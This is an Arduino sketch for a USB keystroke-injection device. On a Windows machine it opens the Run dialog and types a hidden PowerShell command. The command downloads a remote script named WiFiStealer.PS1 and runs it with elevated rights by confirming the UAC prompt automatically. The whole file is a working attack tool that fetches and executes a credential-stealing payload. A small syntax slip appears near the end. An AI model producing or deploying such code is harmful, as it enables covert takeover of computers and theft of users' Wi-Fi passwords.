#include <Keyboard.h>

void setup() {
  // Initialize the USB keyboard emulation
  Keyboard.begin();
  delay(1500);  // Delay to allow time for the keyboard to initialize

  // Simulate pressing the Windows key and 'r' key simultaneously
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();

  delay(2000);  // Delay 2 seconds

  // Type the PowerShell command, specify remote powershell script location 
  Keyboard.print("powershell /w 1 /C Set-ExecutionPolicy RemoteSigned;wget \"https://raw.githubusercontent.com/Mar0dev/LilyGo-TTGO-Examples/main/WiFiStealer.PS1\" -o \\d.ps1;\\d.ps1");

  delay(1000);  // Delay 1 second

  // Simulate Ctrl + Shift + Enter
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(2000);  // Delay 2 seconds

  // Simulate Alt + Y
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  delay(100);
  Keyboard.releaseAll();
  
  delay(300);
  Keyboard.end()
}

void loop() {
  // Empty loop
}
